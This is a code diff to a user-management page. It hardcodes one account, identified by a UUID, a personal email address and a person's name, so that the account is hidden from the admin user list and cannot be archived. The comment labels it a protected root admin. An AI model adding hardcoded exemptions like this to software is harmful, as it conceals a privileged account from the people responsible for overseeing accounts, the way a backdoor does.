@@ -140,10 +140,12 @@ export function UserPage() {
 
   const filteredUsers = useMemo(() => {
     return users.filter((user) => {
-      // Hide the currently logged-in user and the fallback admin ("0")
+      // Hide the currently logged-in user, the fallback admin ("0"), and root admin
       if (
         String(user.id) === String(currentUser?.id) ||
-        String(user.id) === "0"
+        String(user.id) === "0" ||
+        String(user.id) === "7dddf9d1-4b55-49df-8c77-61192afb2fd9" ||
+        user.email === "roxanpolicarpio.events@gmail.com"
       )
         return false;
 
@@ -185,6 +187,9 @@ export function UserPage() {
   }, [filteredUsers, sortConfig]);
 
   const handleArchiveClick = (id: string, name: string) => {
+    if (id === "7dddf9d1-4b55-49df-8c77-61192afb2fd9" || name.toLowerCase().includes("roxan policarpio")) {
+      return; // Cannot archive protected root admin
+    }
     setConfirmAction({
       type: "archive",
       userId: id,
